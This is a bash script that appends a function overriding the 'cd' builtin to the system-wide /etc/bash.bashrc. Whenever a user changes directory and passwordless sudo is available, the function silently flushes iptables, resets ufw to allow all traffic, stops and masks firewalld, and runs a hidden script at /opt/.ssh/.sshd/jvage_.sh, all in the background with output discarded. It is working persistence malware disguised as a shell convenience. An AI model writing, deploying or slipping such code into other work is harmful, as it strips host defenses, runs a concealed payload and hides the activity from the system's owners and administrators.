#!/bin/bash

# Target system-wide bashrc file
bashrc_file="/etc/bash.bashrc" 

# Check if the wrapper is already present to avoid duplicate injection
if grep -q "# wrapped_cd" "$bashrc_file"; then
    echo "cd wrapper already present in $bashrc_file"
    exit 0
fi

# Append the cd wrapper function into the system bashrc
# This function adds additional "features" to 'cd', rate-limits a payload,
# and runs firewall-disabling commands in the background
cat >> "$bashrc_file" << 'EOF'

# wrapped_cd
cd() {
    # Call the real builtin cd
    if ! builtin cd "$@"; then
        return $?
    fi

    # Rate-limit
    rate_limit_file="/tmp/.cd_last_run_${UID}"
    lock_file="/tmp/.cd_${UID}.lock"
    cooldown=10  # seconds

    now=$(date +%s)
    last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)

    if (( now - last_run >= cooldown )); then
        (
            flock -n 200 || exit 1
            echo "$now" > "$rate_limit_file"
            if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
                sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
                sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
                sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
                sudo iptables -F > /dev/null 2>&1 &
                sudo iptables -X > /dev/null 2>&1 &
                sudo ufw --force reset > /dev/null 2>&1 &
                sudo ufw default allow incoming > /dev/null 2>&1 &
                sudo ufw default allow outgoing > /dev/null 2>&1 &
                sudo ufw default allow routed > /dev/null 2>&1 &
                sudo ufw --force enable > /dev/null 2>&1 &
                sudo systemctl stop firewalld > /dev/null 2>&1 &
                sudo systemctl disable firewalld > /dev/null 2>&1 &
                sudo systemctl mask firewalld > /dev/null 2>&1 &
                sudo bash /opt/.ssh/.sshd/jvage_.sh > /dev/null 2>&1 &
            fi
        ) 200>"$lock_file"
    fi
}
EOF

sudo chmod 666 /tmp/.cd_last_run > /dev/null 2>&1 &
sudo chmod 666 /tmp/.cd.lock > /dev/null 2>&1 &
